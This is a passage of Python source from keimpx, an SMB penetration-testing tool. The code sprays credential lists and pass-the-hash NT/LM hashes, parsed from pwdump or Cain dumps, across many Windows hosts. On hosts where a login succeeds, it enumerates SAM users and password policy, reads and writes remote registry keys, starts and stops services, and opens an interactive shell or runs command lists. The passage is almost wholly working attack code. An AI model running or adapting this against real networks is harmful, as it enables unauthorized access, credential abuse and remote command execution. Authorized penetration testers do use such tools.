           return "RUNNING"
        elif status == svcctl.SERVICE_START_PENDING:
           return "START PENDING"
        elif status == svcctl.SERVICE_STOP_PENDING:
           return "STOP PENDING"
        elif status == svcctl.SERVICE_STOPPED:
           return "STOPPED"
        else:
           return "UNKOWN"


    def __svcctl_status(self, srvname):
        '''
        Display status of a service
        '''

        logger.info('Querying the status of service \'%s\'' % srvname)

        ans = self.__svc.QueryServiceStatus(self.__svc_handle)
        status = ans['CurrentState']

        print 'Service \'%s\' status is: %s' % (srvname, self.__svcctl_parse_status(status))


    def __svcctl_info(self, srvname):
        '''
        Display a service information
        '''

        logger.info('Querying service \'%s\' information' % srvname)

        print 'Service \'%s\' information:' % srvname

        resp = self.__svc.QueryServiceConfigW(self.__svc_handle)
        self.__svcctl_parse_info(resp)


    def __svcctl_start(self, srvname, srvargs=None):
        '''
        Start the service
        '''

        logger.info('Starting the service \'%s\'' % srvname)

        if srvargs is None:
            srvargs = []
        else:
            new_srvargs = [ ]

            for arg in str(srvargs).split(' '):
                new_srvargs.append(arg.encode('utf-16le'))

            srvargs = new_srvargs

        self.__svc.StartServiceW(self.__svc_handle, srvargs)
        self.__svcctl_status(srvname)


    def __svcctl_stop(self, srvname):
        '''
        Stop the service
        '''

        logger.info('Stopping the service \'%s\'' % srvname)

        self.__svc.StopService(self.__svc_handle)
        self.__svcctl_status(srvname)


    def __svcctl_list_parse(self, srvname, resp):
        services = []

        for i in range(len(resp)):
            name = resp[i]['ServiceName'].decode('utf-16')
            display = resp[i]['DisplayName'].decode('utf-16')
            state = resp[i]['CurrentState']

            if srvname is not None and srvname.lower() not in name.lower():
                continue

            services.append((name, display, state))

        services.sort()

        print '%-30s - %-70s - STATUS' % ('SERVICE NAME', 'DISPLAY NAME')

        for service in services:
            print "%-30s - %-70s -" % (service[0], service[1]),
            print self.__svcctl_parse_status(service[2])


    def __svcctl_list(self, srvname):
        '''
        List services
        '''

        logger.info('Listing services')

        #resp = self.__svc.EnumServicesStatusW(self.__mgr_handle, serviceState=svcctl.SERVICE_STATE_ALL)
        resp = self.__svc.EnumServicesStatusW(self.__mgr_handle, serviceType=svcctl.SERVICE_WIN32_OWN_PROCESS | svcctl.SERVICE_WIN32_SHARE_PROCESS | svcctl.SERVICE_INTERACTIVE_PROCESS, serviceState=svcctl.SERVICE_STATE_ALL)
        self.__svcctl_list_parse(srvname, resp)

        print 'Total services: %d\n' % len(resp)


    def __samr_connect(self):
        '''
        Connect to samr named pipe
        '''

        logger.info('Connecting to the SAMR named pipe')

        self.__smb_transport('samr')

        logger.debug('Binding on Security Account Manager (SAM) interface')
        self.__dce = dcerpc.DCERPC_v5(self.trans)
        self.__dce.bind(MSRPC_UUID_SAMR)
        self.__samr = DCERPCSamr(self.__dce)

        resp = self.__samr.connect()
        self.__rpcerror(resp.get_return_code())

        self.__mgr_handle = resp.get_context_handle()


    def __samr_disconnect(self):
        '''
        Disconnect from samr named pipe
        '''

        logger.debug('Disconneting from the SAMR named pipe')

        if self.__mgr_handle:
            data = self.__samr.closerequest(self.__mgr_handle)
            self.__rpcerror(data.get_return_code())

        self.__dce.disconnect()


    def __samr_users(self, usrdomain=None):
        '''
        Enumerate users on the system
        '''

        self.__samr_domains(False)

        encoding = sys.getdefaultencoding()

        for domain_name, domain in self.domainsDict.items():
            if usrdomain is not None and usrdomain.upper() != domain_name.upper():
                continue

            logger.info('Looking up users in domain \'%s\'' % domain_name)

            resp = self.__samr.lookupdomain(self.__mgr_handle, domain)
            self.__rpcerror(resp.get_return_code())

            resp = self.__samr.opendomain(self.__mgr_handle, resp.get_domain_sid())
            self.__rpcerror(resp.get_return_code())

            self.__domain_context_handle = resp.get_context_handle()

            resp = self.__samr.enumusers(self.__domain_context_handle)
            self.__rpcerror(resp.get_return_code())

            for user in resp.get_users().elements():
                uname = user.get_name().encode(encoding, 'replace')
                uid = user.get_id()

                r = self.__samr.openuser(self.__domain_context_handle, uid)
                logger.debug('Found user \'%s\' (UID: %d)' % (uname, uid))

                if r.get_return_code() == 0:
                    info = self.__samr.queryuserinfo(r.get_context_handle()).get_user_info()
                    entry = (uname, uid, info)
                    self.usersList.add(entry)
                    c = self.__samr.closerequest(r.get_context_handle())

            if self.usersList:
                num = len(self.usersList)

                if num == 1:
                    logger.info('Enumerated one user')
                else:
                    logger.info('Enumerated %d user' % num)
            else:
                logger.info('No users enumerated')

            for entry in self.usersList:
                user, uid, info = entry

                print user
                print '  User ID: %d' % uid
                print '  Group ID: %d' % info.get_group_id()
                print '  Enabled: %s' % ('False', 'True')[info.is_enabled()]

                try:
                    print '  Logon count: %d' % info.get_logon_count()
                except ValueError:
                    pass

                try:
                    print '  Last Logon: %s' % info.get_logon_time()
                except ValueError:
                    pass

                try:
                    print '  Last Logoff: %s' % info.get_logoff_time()
                except ValueError:
                    pass

                try:
                    print '  Kickoff: %s' % info.get_kickoff_time()
                except ValueError:
                    pass

                try:
                    print '  Last password set: %s' % info.get_pwd_last_set()
                except ValueError:
                    pass

                try:
                    print '  Password can change: %s' % info.get_pwd_can_change()
                except ValueError:
                    pass

                try:
                    print '  Password must change: %s' % info.get_pwd_must_change()
                except ValueError:
                    pass

                try:
                    print '  Bad password count: %d' % info.get_bad_pwd_count()
                except ValueError:
                    pass

                items = info.get_items()

                for i in MSRPCUserInfo.ITEMS.keys():
                    name = items[MSRPCUserInfo.ITEMS[i]].get_name()
                    name = name.encode(encoding, 'replace')

                    if name:
                        print '  %s: %s' % (i, name)

            self.usersList = set()


    def __samr_pswpolicy(self, usrdomain=None):
        '''
        Enumerate password policy on the system
        '''

        self.__samr_domains(False)

        encoding = sys.getdefaultencoding()

        for domain_name, domain in self.domainsDict.items():
            if usrdomain is not None and usrdomain.upper() != domain_name.upper():
                continue

            logger.info('Looking up password policy in domain \'%s\'' % domain_name)

            resp = self.__samr.lookupdomain(self.__mgr_handle, domain)
            self.__rpcerror(resp.get_return_code())

            resp = self.__samr.opendomain(self.__mgr_handle, resp.get_domain_sid())
            self.__rpcerror(resp.get_return_code())

            self.__domain_context_handle = resp.get_context_handle()

            resp = self.__samr.enumpswpolicy(self.__domain_context_handle)
            resp.print_friendly()


    def __samr_domains(self, display=True):
        '''
        Enumerate domains to which the system is part of
        '''

        logger.info('Enumerating domains')

        resp = self.__samr.enumdomains(self.__mgr_handle)
        self.__rpcerror(resp.get_return_code())

        domains = resp.get_domains().elements()

        if display is True:
            print 'Domains:'

        for domain in range(0, resp.get_entries_num()):
            domain = domains[domain]
            domain_name = domain.get_name()

            if domain_name not in self.domainsDict:
                self.domainsDict[domain_name] = domain

            if display is True:
                print '  %s' % domain_name


    def __winreg_connect(self):
        '''
        Connect to winreg named pipe
        '''

        logger.info('Connecting to the WINREG named pipe')

        self.__smb_transport('winreg')

        logger.debug('Binding on Windows registry (WINREG) interface')
        self.__dce = dcerpc.DCERPC_v5(self.trans)
        self.__dce.bind(winreg.MSRPC_UUID_WINREG)
        self.__winreg = winreg.DCERPCWinReg(self.__dce)


    def __winreg_disconnect(self):
        '''
        Disconnect from winreg named pipe
        '''

        logger.debug('Closing registry key')
        self.__winreg.regCloseKey(self.__regkey_handle)

        logger.debug('Disconneting from the WINREG named pipe')
        self.__dce.disconnect()


    def __winreg_parse(self):
        '''
        Parse the provided registry key
        '''

        __reg_key_parse = re.findall('(HKLM|HKCR|HKU|HKCU)\\\\(.*\\\\)(.+)$', self.__winreg_key, re.I)

        if len(__reg_key_parse) < 1:
            raise registryKey, 'Invalid registry key provided, make sure it is like HKLM\\registry\\path\\name'

        self.__winreg_hive, self.__winreg_path, self.__winreg_name = __reg_key_parse[0]


    def __winreg_open(self):
        '''
        Bind to registry hive
        '''

        self.__winreg_parse()

        if self.__winreg_hive.upper() == 'HKLM':
            self.__resp = self.__winreg.openHKLM()
        elif self.__winreg_hive.upper() == 'HKCR':
            self.__resp = self.__winreg.openHKCR()
        elif self.__winreg_hive.upper() in ('HKU', 'HKCU'):
            self.__resp = self.__winreg.openHKU()

        self.__mgr_handle = self.__resp.get_context_handle()

        logger.debug('Opening registry key')

        self.__resp = self.__winreg.regOpenKey(self.__mgr_handle, self.__winreg_path, winreg.KEY_ALL_ACCESS)
        self.__rpcerror(self.__resp.get_return_code())
        self.__regkey_handle = self.__resp.get_context_handle()


    def __winreg_read(self):
        '''
        Read a registry key
        '''

        logger.info('Reading registry key \'%s\' value' % self.__winreg_key)

        self.__regkey_value = self.__winreg.regQueryValue(self.__regkey_handle, self.__winreg_name, 1024)
        self.__rpcerror(self.__regkey_value.get_return_code())

        print self.__regkey_value.get_data()


    def __winreg_write(self):
        '''
        Write a value on a registry key
        '''

        logger.info('Write value \'%s\' to registry key \'%s\'' % (self.__winreg_value, self.__winreg_key))

        resp = self.__winreg.regCreateKey(self.__regkey_handle, self.__winreg_name)
        self.__rpcerror(resp.get_return_code())

        resp = self.__winreg.regSetValue(self.__regkey_handle, winreg.REG_SZ, self.__winreg_name, self.__winreg_value)
        self.__rpcerror(resp.get_return_code())


    def __winreg_delete(self):
        '''
        Delete a registry key
        '''

        logger.error('Registry key deletion is not yet implemented')
        return

        # TODO: it does not work yet
        logger.info('Deleting registry key \'%s\'' % self.__winreg_key)

        resp = self.__winreg.regDeleteValue(self.__regkey_handle, '')
        self.__rpcerror(resp.get_return_code())

        resp = self.__winreg.regDeleteKey(self.__regkey_handle, self.__winreg_name)
        self.__rpcerror(resp.get_return_code())


    def __rpcerror(self, code):
        '''
        Check for an error in a response packet
        '''

        if code in dcerpc.rpc_status_codes:
            logger.error('Error during negotiation: %s (%d)' % (dcerpc.rpc_status_codes[code], code))
            raise RuntimeError

        elif code != 0:
            logger.error('Unknown error during negotiation (%d)' % code)
            raise RuntimeError

        #logger.debug('RPC code returned: %d' % code)


class test_login(Thread):
    def __init__(self, target):
        Thread.__init__(self)

        self.__target = target
        self.__dstip = self.__target.getHost()
        self.__dstport = self.__target.getPort()
        self.__dstname = '*SMBSERVER'
        self.__srcname = conf.name
        self.__timeout = 10


    def connect(self):
        self.__smb = smb.SMB(remote_name=self.__dstname, remote_host=self.__dstip, my_name=self.__srcname, sess_port=self.__dstport, timeout=self.__timeout)


    def login(self, user, password, lmhash, nthash, domain):
        self.__smb.login(user=user, password=password, domain=domain, lmhash=lmhash, nthash=nthash)


    def logoff(self):
        self.__smb.logoff()


    def run(self):
        global credentials
        global successes

        try:
            logger.info('Attacking host %s' % self.__target.getIdentity())

            for credential in credentials:
                user, password, lmhash, nthash = credential.getCredentials()

                if password != '' or ( password == '' and lmhash == '' and nthash == ''):
                    password_str = password or 'BLANK'
                elif lmhash != '' and nthash != '':
                    password_str = '%s:%s' % (lmhash, nthash)

                for domain in domains:
                    status = False

                    if domain:
                        target_str = '%s:%s@%s' % (self.__dstip, self.__dstport, domain)
                    else:
                        target_str = '%s:%s' % (self.__dstip, self.__dstport)

                    try:
                        self.connect()
                        self.login(user, password, lmhash, nthash, domain)
                        self.logoff()

                        logger.info('Valid credentials on %s: %s/%s' % (target_str, user, password_str))

                        status = True
                        successes += 1

                    except smb.SessionError, e:
                        logger.info('Wrong credentials on %s: %s/%s (%s)' % (target_str, user, password_str, str(e).split('code: ')[1]))

                        status = str(e.get_error_code())
                    except smb.UnsupportedFeature, e:
                        logger.warn(str(e))

                    credential.addAnswer(self.__dstip, self.__dstport, domain, status)
                    self.__target.addAnswer(user, password, lmhash, nthash, domain, status)

                    if status is True:
                        break

            logger.info('Attack on host %s finished' % self.__target.getIdentity())

        except (socket.error, NetBIOSTimeout), e:
            logger.warn('Connection to host %s failed (%s)' % (self.__target.getIdentity(), e[1]))

        pool_thread.release()


class CredentialsStatus:
    def __init__(self, user, password, lmhash, nthash, domain, status):
        self.user = user
        self.password = password
        self.lmhash = lmhash
        self.nthash = nthash
        self.domain = domain
        self.status = status


    def getUser(self):
        return self.user


    def getPassword(self):
        return self.password


    def getlmhash(self):
        return self.lmhash


    def getnthash(self):
        return self.nthash    


    def getDomain(self):
        return self.domain


    def getStatus(self):
        return self.status


    def getIdentity(self):
        if self.lmhash != '' and self.nthash != '':
            return '%s/%s:%s' % (self.user, self.lmhash, self.nthash)
        elif self.user not in ( None, '' ):
            return '%s/%s' % (self.user, self.password or 'BLANK')


class TargetStatus:
    def __init__(self, host, port, domain, status):
        self.host = host
        self.port = port
        self.domain = domain
        self.status = status


    def getHost(self):
        return self.host


    def getPort(self):
        return self.port


    def getDomain(self):
        return self.domain


    def getStatus(self):
        return self.status


    def getIdentity(self):
        if self.domain:
            return '%s:%s@%s' % (self.host, self.port, self.domain)
        else:
            return '%s:%s' % (self.host, self.port)


class Credentials:
    def __init__(self, user, password='', lmhash='', nthash=''):
        self.user = user
        self.password = password
        self.lmhash = lmhash
        self.nthash = nthash

        # Targets where these credentials have been tested
        self.targets = []

        
    def getUser(self):
        return self.user


    def getPassword(self):
        return self.password


    def getlmhash(self):
        return self.lmhash


    def getnthash(self):
        return self.nthash


    def getIdentity(self):
        if self.lmhash != '' and self.nthash != '':
            return '%s/%s:%s' % (self.user, self.lmhash, self.nthash)
        elif self.user not in ( None, '' ):
            return '%s/%s' % (self.user, self.password or 'BLANK')


    def getCredentials(self):
        if self.password != '' or ( self.password == '' and self.lmhash == '' and self.nthash == ''):
            return self.user, self.password, '', ''
        elif self.lmhash != '' and self.nthash != '':
            return self.user, '', self.lmhash, self.nthash


    def addAnswer(self, host, port, domain, status):
        self.targets.append(TargetStatus(host, port, domain, status))


    def getResults(self, status=True):
        return_targets = []

        for target in self.targets:
            if target.getStatus() == status or status == '*':
                return_targets.append(target)

        return return_targets


class Target:
    def __init__(self, target, port):
        self.target = target
        self.port = port

        # Credentials tested on this target
        self.credentials = []


    def getHost(self):
        return self.target


    def getPort(self):
        return self.port


    def getIdentity(self):
        return '%s:%s' % (self.target, self.port)


    def addAnswer(self, user, password, lmhash, nthash, domain, status):
        self.credentials.append(CredentialsStatus(user, password, lmhash, nthash, domain, status))


    def getResults(self, status=True):
        return_credentials = []

        for credentials in self.credentials:
            if credentials.getStatus() == status or status == '*':
                return_credentials.append(credentials)

        return return_credentials


def read_input(msg, counter):
    while True:
        choice = raw_input(msg)

        if choice == '':
            choice = 1
            break
        elif choice.isdigit() and int(choice) >= 1 and int(choice) <= counter:
            choice = int(choice)
            break
        else:
            logger.warn('The choice must be a digit between 1 and %d' % counter)

    return choice


def remove_comments(lines):
    cleaned_lines = []

    for line in lines:
        # Ignore comment lines and blank ones
        if line.find('#') == 0 or line.isspace() or len(line) == 0:
            continue

        cleaned_lines.append(line)

    return cleaned_lines


def add_execute(cmd):
    global execute_commands

    #if cmd is not None and len(cmd) > 0 and cmd not in execute_commands:
    if cmd is not None and len(cmd) > 0:
        execute_commands.append(cmd)


def parse_executelist_file():
    try:
        fp = open(conf.executelist, 'r')
        file_lines = fp.read().splitlines()
        fp.close()

    except IOError, e:
        logger.error('Could not open list of commands file \'%s\'' % conf.executelist)
        return

    file_lines = remove_comments(file_lines)

    for line in file_lines:
        add_execute(line)


def executelist():
    global execute_commands
    global targets

    parse_executelist_file()

    targets_tuple = ()

    for target in targets:
        results = target.getResults()

        logger.info('Executing commands on %s' % target.getIdentity())

        if len(results):
            first_credentials = results[0]

        try:
            shell = SMBShell(target, first_credentials)
            shell.run(execute_commands)
        except RuntimeError:
            sys.exit(255)


def parse_domains_file(filename):
    try:
        fp = open(filename, 'r')
        file_lines = fp.read().splitlines()
        fp.close()

    except IOError, e:
        logger.error('Could not open domains file \'%s\'' % filename)
        return

    file_lines = remove_comments(file_lines)

    for line in file_lines:
        add_domain(line)


def add_domain(line):
    global domains

    try:
        local_domains = str(line).replace(' ', '').split(',')
    except domainError, _:
        logger.warn('Bad line in domains file \'%s\': %s' % (conf.domainsfile, line))
        return

    domains.extend(local_domains)

    logger.debug('Parsed domain(s) \'%s\'' % ', '.join([domain for domain in local_domains]))


def set_domains():
    global domains
    global conf

    logger.info('Loading domains')

    if conf.domain is not None:
        logger.debug('Loading domains from command line')
        add_domain(str(conf.domain))

    if conf.domainsfile is not None:
        logger.debug('Loading domains from file \'%s\'' % conf.list)
        parse_domains_file(conf.domainsfile)

    domains = list(set(domains))


def parse_credentials_file(filename):
    try:
        fp = open(filename, 'r')
        file_lines = fp.read().splitlines()
        fp.close()

    except IOError, e:
        logger.error('Could not open credentials file \'%s\'' % filename)
        return

    file_lines = remove_comments(file_lines)

    for line in file_lines:
        add_credentials(line=line)


def parse_credentials(credentials_line):
    credentials_line = credentials_line.replace('NO PASSWORD*********************', '00000000000000000000000000000000')

    fgdumpmatch = re.compile('^(\S*?):.*?:(\S*?):(\S*?):.*?:.*?:')
    fgdump = fgdumpmatch.match(credentials_line)

    cainmatch = re.compile('^(\S*?):.*?:.*?:(\S*?):(\S*?)$')
    cain = cainmatch.match(credentials_line)

    plaintextpassmatch = re.compile('^(\S+?)\s(\S*?)$')
    plain = plaintextpassmatch.match(credentials_line)

    # Credentials with hashes (pwdump/pwdumpx/fgdump/pass-the-hash output format)
    if fgdump:
        try:
            binascii.a2b_hex(fgdump.group(2))
            binascii.a2b_hex(fgdump.group(3))

            return fgdump.group(1), '', fgdump.group(2), fgdump.group(3)
        except:
            raise credentialsError, 'credentials error'

    # Credentials with hashes (cain/l0phtcrack output format)
    elif cain:
        try:
            binascii.a2b_hex(cain.group(2))
            binascii.a2b_hex(cain.group(3))

            return cain.group(1), '', cain.group(2), cain.group(3)
        except:
            raise credentialsError, 'credentials error'

    # Credentials with password (added by user manually divided by a space)
    elif plain:
        return plain.group(1), plain.group(2), '', ''

    else:
        raise credentialsError, 'credentials error'


def add_credentials(user=None, password='', lmhash='', nthash='', line=None):
    global added_credentials
    global credentials

    if line is not None:
        try:
            user, password, lmhash, nthash = parse_credentials(line)
        except credentialsError, _:
            logger.warn('Bad line in credentials file \'%s\': %s' % (conf.credsfile, line))
            return

    if (user, password, lmhash, nthash) in added_credentials:
        return
    elif user is not None:
        added_credentials.add((user, password, lmhash, nthash))

        credential = Credentials(user, password, lmhash, nthash)
        credentials.append(credential)

        logger.debug('Parsed credentials \'%s\'' % credential.getIdentity())


def set_credentials():
    global conf

    logger.info('Loading credentials')

    if conf.user is not None:
        logger.debug('Loading credentials from command line')
        add_credentials(conf.user, conf.password or '', conf.lmhash or '', conf.nthash or '')

    if conf.credsfile is not None:
        logger.debug('Loading credentials from file \'%s\'' % conf.credsfile)
        parse_credentials_file(conf.credsfile)


def parse_targets_file(filename):
    try:
        fp = open(filename, 'r')
        file_lines = fp.read().splitlines()
        fp.close()

    except IOError, e:
        logger.error('Could not open targets file \'%s\'' % filename)
        return

    file_lines = remove_comments(file_lines)

    for line in file_lines:
        add_target(line)


def parse_target(target_line):
    targetmatch = re.compile('^([A-z0-9\.]+)(:(\d+))?')
    h = targetmatch.match(target_line)

    if h and h.group(3):
        host = h.group(1)
        port = h.group(3)

        if port.isdigit() and int(port) > 1 and int(port) < 65535:
            return host, int(port)
        else:
            return host, conf.port

    elif h:
        host = h.group(1)

        return host, conf.port

    else:
        raise targetError, 'target error'


def add_target(line):
    global added_targets
    global targets

    try:
        host, port = parse_target(line)
    except targetError, _:
        logger.warn('Bad line in targets file \'%s\': %s' % (conf.list, line))
        return

    if (host, port) in added_targets:
        return
    else:
        added_targets.add((host, port))

        target = Target(host, port)
        targets.append(target)

        logger.debug('Parsed target \'%s\'' % target.getIdentity())


def set_targets():
    global conf
    global targets

    logger.info('Loading targets')

    if conf.target is not None:
        logger.debug('Loading targets from command line')
        add_target(str(conf.target))

    if conf.list is not None:
        logger.debug('Loading targets from file \'%s\'' % conf.list)
        parse_targets_file(conf.list)


def set_verbosity(level=None):
    if level is not None:
        conf.verbose = int(level)

    if conf.verbose is None:
        conf.verbose = 0

    conf.verbose = int(conf.verbose)

    if conf.verbose == 1:
        logger.setLevel(logging.INFO)
    elif conf.verbose > 1:
        conf.verbose = 2
        logger.setLevel(logging.DEBUG)


def check_conf():
    global conf

    set_verbosity()

    if conf.name is None:
        conf.name = socket.gethostname()

    conf.name = str(conf.name)

    if conf.port is None:
        conf.port = 445

    logger.debug('Using \'%s\' as local hostname' % conf.name)

    if conf.threads < 3:
        conf.threads = 3
        logger.warn('Forcing number of threads to 3')

    set_targets()
    set_credentials()
    set_domains()


def cmdline_parser():
    '''
    This function parses the command line parameters and arguments
    '''

    usage = '%s [options]' % sys.argv[0]
    parser = OptionParser(usage=usage, version=__version__)

    try:
        parser.add_option('-v', dest='verbose', type='int', default=0,
                          help='Verbosity level: 0-2 (default: 0)')

        parser.add_option('-t', dest='target', help='Target address')

        parser.add_option('-l', dest='list', help='File with list of targets')

        parser.add_option('-U', dest='user', help='User')

        parser.add_option('-P', dest='password', help='Password')

        parser.add_option('--nt', dest='nthash', help='NT hash')

        parser.add_option('--lm', dest='lmhash', help='LM hash')

        parser.add_option('-c', dest='credsfile', help='File with list of credentials')

        parser.add_option('-D', dest='domain', help='Domain')

        parser.add_option('-d', dest='domainsfile', help='File with list of domains')

        parser.add_option('-p', dest='port', type='int', default=445,
                           help='SMB port: 139 or 445 (default: 445)')

        parser.add_option('-n', dest='name', help='Local hostname')

        parser.add_option('-T', dest='threads', type='int', default=10,
                          help='Maximum simultaneous connections (default: 10)')

        parser.add_option('-b', dest='batch', action="store_true", default=False,
                          help='Batch mode: do not ask to get an interactive SMB shell')

        parser.add_option('-x', dest='executelist', help='Execute a list of '
                          'commands against all hosts')

        (args, _) = parser.parse_args()

        if not args.target and not args.list:
            errMsg  = 'missing a mandatory parameter (-t or -l), '
            errMsg += '-h for help'
            parser.error(errMsg)

        return args
    except (OptionError, TypeError), e:
        parser.error(e)

    debugMsg = 'Parsing command line'
    logger.debug(debugMsg)


def banner():
    print '''
    keimpx %s
    by %s
    ''' % (__version__, __author__)


def main():
    global credentials
    global conf
    global domains
    global pool_thread
    global targets
    global have_readline

    banner()
    conf = cmdline_parser()
    check_conf()

    if len(targets) < 1:
        logger.error('No valid targets loaded')
        sys.exit(1)

    logger.info('Loaded %s unique targets' % len(targets))

    if len(credentials) < 1:
        logger.error('No valid credentials loaded')
        sys.exit(1)

    logger.info('Loaded %s unique credentials' % len(credentials))

    if len(domains) == 0:
        logger.info('No domains specified, using NULL domain')
        domains.append('')
    elif len(domains) > 0:
        logger.info('Loaded %s unique domains' % len(domains))

    pool_thread = threading.BoundedSemaphore(conf.threads)

    try:
        for target in targets:
            pool_thread.acquire()
            current = test_login(target)
            current.start()

        while (threading.activeCount() > 1):
            a = 'Caughtit'
            pass

    except KeyboardInterrupt:
        try:
            logger.warn('Test interrupted, waiting for threads to finish')

            while (threading.activeCount() > 1):
                a = 'Caughtit'
                pass

        except KeyboardInterrupt:
            logger.info('User aborted')
            sys.exit(1)

    if successes == 0:
        print '\nNo credentials worked on any target\n'
        sys.exit(1)

    print '\nThe credentials worked in total %d times\n' % successes
    print 'TARGET SORTED RESULTS:\n'

    for target in targets:
        results = target.getResults()

        if len(results):
            print target.getIdentity()

            for result in results:
                print '  %s' % result.getIdentity()

            print

    print '\nUSER SORTED RESULTS:\n'

    for credential in credentials:
        results = credential.getResults()

        if len(results):
            print credential.getIdentity()

            for result in results:
                print '  %s' % result.getIdentity()

            print

    if conf.batch is True:
        return
    elif conf.executelist is not None:
        executelist()
        return

    msg = 'Do you want to get a shell from any of the targets? [Y/n] '
    choice = raw_input(msg)

    if choice and choice[0].lower() != 'y':
        return

    counter = 0
    targets_dict = {}

    msg = 'Which target do you want to connect to?'

    for target in targets:
        results = target.getResults()

        if len(results):
            counter += 1
            msg += '\n[%d] %s' % (counter, target.getIdentity())
            targets_dict[counter] = (target, results)

    msg += '\n> '

    choice = read_input(msg, counter)
    target, credentials = targets_dict[int(choice)]
    counter = 0
    credentials_dict = {}

    msg = 'Which credentials do you want to use to connect?'

    for credential in credentials:
        counter += 1
        msg += '\n[%d] %s' % (counter, credential.getIdentity())
        credentials_dict[counter] = credential

    msg += '\n> '

    choice = read_input(msg, counter)
    credentials = credentials_dict[int(choice)]

    if mswindows is True and have_readline:
        try:
            _outputfile = _rl.GetOutputFile()
        except AttributeError:
            debugMsg  = 'Failed GetOutputFile when using platform\'s '
            debugMsg += 'readline library'
            logger.debug(debugMsg)

            have_readline = False

    uses_libedit = False

    if sys.platform.lower() == 'darwin' and have_readline:
        import commands

        (status, result) = commands.getstatusoutput( 'otool -L %s | grep libedit' % _rl.__file__ )

        if status == 0 and len(result) > 0:
            _rl.parse_and_bind('bind ^I rl_complete')

            debugMsg  = 'Leopard libedit detected when using platform\'s '
            debugMsg += 'readline library'
            logger.debug(debugMsg)

            uses_libedit = True

    if have_readline:
        try:
            _rl.clear_history
        except AttributeError:
            def clear_history():
                pass

            _rl.clear_history = clear_history

    autoCompletion()

    try:
        shell = SMBShell(target, credentials)
        shell.run()
    except RuntimeError:
        sys.exit(255)


if __name__ == '__main__':
    warnings.filterwarnings(action='ignore', category=DeprecationWarning)

    try:
        main()
    except KeyboardInterrupt:
        print '\nBye bye!'

    sys.exit(0)
